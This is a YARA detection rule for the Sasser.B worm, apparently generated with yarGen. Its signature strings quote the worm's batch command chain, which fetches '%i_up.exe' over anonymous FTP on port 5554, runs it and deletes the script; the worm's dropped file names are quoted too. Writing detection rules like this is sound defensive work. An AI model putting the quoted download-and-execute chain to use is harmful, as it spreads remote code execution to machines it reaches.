/*
   YARA Rule Set
   Author: HTB-AC-1135606
   Date: 2025-05-14
   Identifier: tmp1m27qyhn
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule Sasser_B {
   meta:
      description = "tmp1m27qyhn - file Sasser.B.exe"
      author = "HTB-AC-1135606"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-05-14"
      hash1 = "00808f00ec970e3ed518ed40ba77f64be2b9761b02fbaea2047c5ac82d8b8f99"
   strings:
      $x1 = "echo off&echo open %s 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get %i_up.exe>>cmd.ftp&echo bye>>cm" ascii /* score: '35.00'*/
      $x2 = "d.ftp&echo on&ftp -s:cmd.ftp&%i_up.exe&echo off&del cmd.ftp&echo on" fullword ascii /* score: '32.00'*/
      $s3 = "echo off&echo open %s 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get %i_up.exe>>cmd.ftp&echo bye>>cm" ascii /* score: '27.00'*/
      $s4 = "c:\\win2.log" fullword ascii /* score: '22.00'*/
      $s5 = "avserve2.exe" fullword ascii /* score: '22.00'*/
      $s6 = "r32.dll" fullword ascii /* score: '20.00'*/
      $s7 = "C:\\TRABAJO\\B.EX" fullword ascii /* score: '13.00'*/
      $s8 = "rary %s.Qord" fullword ascii /* score: '7.00'*/
      $s9 = "#%s could not be" fullword ascii /* score: '7.00'*/
      $s10 = "\\\\192.168.1.210\\IPC$" fullword wide /* score: '7.00'*/
      $s11 = "dynamic link lib" fullword ascii /* score: '6.00'*/
      $s12 = "avserve2" fullword ascii /* score: '5.00'*/
      $s13 = "Jobaka3" fullword ascii /* score: '5.00'*/
      $s14 = "VWuBhdT@" fullword ascii /* score: '4.00'*/
      $s15 = "inal %d" fullword ascii /* score: '4.00'*/
      $s16 = "\"WWSh8o@" fullword ascii /* score: '4.00'*/
      $s17 = "SVWh8o@" fullword ascii /* score: '4.00'*/
      $s18 = "MessageB" fullword ascii /* score: '4.00'*/
      $s19 = "JumpallsNlsTillt" fullword ascii /* score: '4.00'*/
      $s20 = "YZqvgff" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

